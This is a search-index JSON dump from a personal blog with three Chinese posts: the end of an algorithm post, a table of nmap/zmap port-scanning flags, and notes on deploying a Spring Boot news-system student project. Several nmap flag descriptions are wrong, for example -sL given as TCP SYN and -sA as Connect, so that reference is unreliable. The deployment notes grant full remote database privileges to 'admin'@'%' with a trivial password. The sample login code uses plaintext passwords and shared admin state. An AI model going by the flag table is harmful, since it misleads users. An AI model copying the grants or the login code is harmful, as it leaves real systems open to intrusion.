将这一条链路加入resultLinks（链路映射最终结果） &#125;else&#123; return false;//链路不通，映射失败 &#125; &#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://waynamigo.github.io/categories/算法/"}],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"http://waynamigo.github.io/tags/algorithm/"}]},{"title":"nmap zmap使用","slug":"2018-12-01-nmap&zmap","date":"2018-11-30T16:00:00.000Z","updated":"2022-07-16T04:45:11.154Z","comments":true,"path":"2018/12/01/2018-12-01-nmap&zmap/","link":"","permalink":"http://waynamigo.github.io/2018/12/01/2018-12-01-nmap&zmap/","excerpt":"nmap 和 zmap的参数表，端口嗅探","text":"nmap 和 zmap的参数表，端口嗅探 参数表 参数 功能 -sL TCP SYN -sT Connect -sA ACK -sW Window -sM Maimon scans -sU UDP scan -sN TCP NULL -sF FIN -sX Xmax scans -sI host:probeport] zombie host scan -sY SCTP INIT -sZ Cookie-echo scans -sO IP protocol scan -b FTPserver FTP bounce scan 主机扫描 参照的详解文章[https://www.cnblogs.com/nmap/p/6232969.html] 参数 功能 -sL TCP SYN -sn Ping Scan - disable port scan（测试过对方主机把icmp包都丢弃掉，依然能检测到对方开机状态） -sS 发送SYN包到远程主机，但不会产生任何会话，目标主机不会把连接记入系统日志。（为了防止对方判断为扫描攻击，目前挺多加防服务器直接会把扫自己端口的的ip拉黑） -sA Connect，探测主机是否开机 -PE Connect -PS80 ACK -PR Window -Pn 无ping扫描 -sP 快速ping，扫描本地局域网有那些机器，或者直接可以用前缀式表示类似于x.x.x.0/24","categories":[{"name":"渗透","slug":"渗透","permalink":"http://waynamigo.github.io/categories/渗透/"}],"tags":[{"name":"sniffer","slug":"sniffer","permalink":"http://waynamigo.github.io/tags/sniffer/"}]},{"title":"springboot+modleView+rmi调用自己写的天气预报的新闻系统","slug":"2018-11-30-newsSystem","date":"2018-11-29T16:00:00.000Z","updated":"2022-07-16T04:45:11.183Z","comments":true,"path":"2018/11/30/2018-11-30-newsSystem/","link":"","permalink":"http://waynamigo.github.io/2018/11/30/2018-11-30-newsSystem/","excerpt":"一个springboot(collect springmvc、hibernate、modleView）+rmi远程调用天气预报系统的小项目","text":"一个springboot(collect springmvc、hibernate、modleView）+rmi远程调用天气预报系统的小项目 newsSystem 先放上作业的代码地址 新闻系统 newsSystem 下面是在centos服务器上部署环境，建一个新数据库用户进行管理创建数据库123456yum install mysql mysql-server mysql-develcreate user newsadmin;create database newsbase;grant all privileges on newsbase.* to newsadmin@localhost identified by'password';revoke all on *.* from 'admin'@'%';grant all on *.* to 'admin'@'%' identified by 'wdnm' 数据库用户名，密码在application.yml文件中配置 服务器环境123456yum install java-1.8.0-openjdk-devel安装maven到usr/local/apache-mavenexport MAVEN_HOME=/usr/local/apache-mavenexport PATH=$&#123;MAVEN_HOME&#125;/bin:$PATH服务器端Could not find or load main class org.apache.maven.wrapper.MavenWrapperMain错误解决：mvn io.takari:maven:wrapper 环境变量别写错mysql服务没启动的错误，很奇妙 123/etc/rc.d/init.d/mysqld status /etc/init.d/mysqld start 创建项目文件夹12mkdir /classdesignchmod 754 /classdesign 运行项目123nohup java -jar newsSystem.jar &gt; springbootinfo.out 2&gt;&amp;1 &amp;或nohup ./mvnw spring-boot:run &gt; springbootinfo.out 2&gt;&amp;1 &amp; 代码高亮测试1234567891011121314151617181920212223242526272829303132333435 @Controller public class PageController &#123; @Autowired UserService userService=new UserService(); @Autowired NewsService newsService=new NewsService(); boolean isadmin = false; private static Logger logger = Logger.getLogger(PageController.class); @RequestMapping(\"/login/\") public String login(@RequestParam(value = \"username\", defaultValue = \"null\") String name, @RequestParam(value = \"password\", defaultValue = \"null\") String password, Model model)&#123;//String username, String password,Model model try &#123; User user = userService.findUser(name,password); if (user!=null)&#123; model.addAttribute(\"user\",user); if(user.getId()==1)&#123; logger.info(\"admin status\"); isadmin=true; &#125; logger.info(\"login success:username=\"+name); return \"redirect:/newspage/\"; &#125;else&#123; model.addAttribute(\"msg\",\"nosuchuser\"); logger.info(\"login failed:no such user\"); // return \"success\"; &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; return null; &#125;&#125; latex math测试$$[\\begin{matrix} a&amp;b\\\\c&amp;d \\end{matrix}\\quad\\begin{pmatrix} a&amp;b\\\\c&amp;d \\end{pmatrix}\\quad\\begin{bmatrix} a&amp;b\\\\c&amp;d \\end{bmatrix}\\quad\\begin{Bmatrix} a&amp;b\\\\c&amp;d \\end{Bmatrix}\\quad\\begin{vmatrix} a&amp;b\\\\c&amp;d \\end{vmatrix}\\quad\\begin{Vmatrix} a&amp;b\\\\c&amp;d \\end{Vmatrix}\\quad]$$ 数据库内容 Tables_in_newsbase hibernate_sequence news user ——————–","categories":[{"name":"java","slug":"java","permalink":"http://waynamigo.github.io/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"http://waynamigo.github.io/tags/java/"},{"name":"springboot","slug":"springboot","permalink":"http://waynamigo.github.io/tags/springboot/"},{"name":"rmi","slug":"rmi","permalink":"http://waynamigo.github.io/tags/rmi/"}]}]}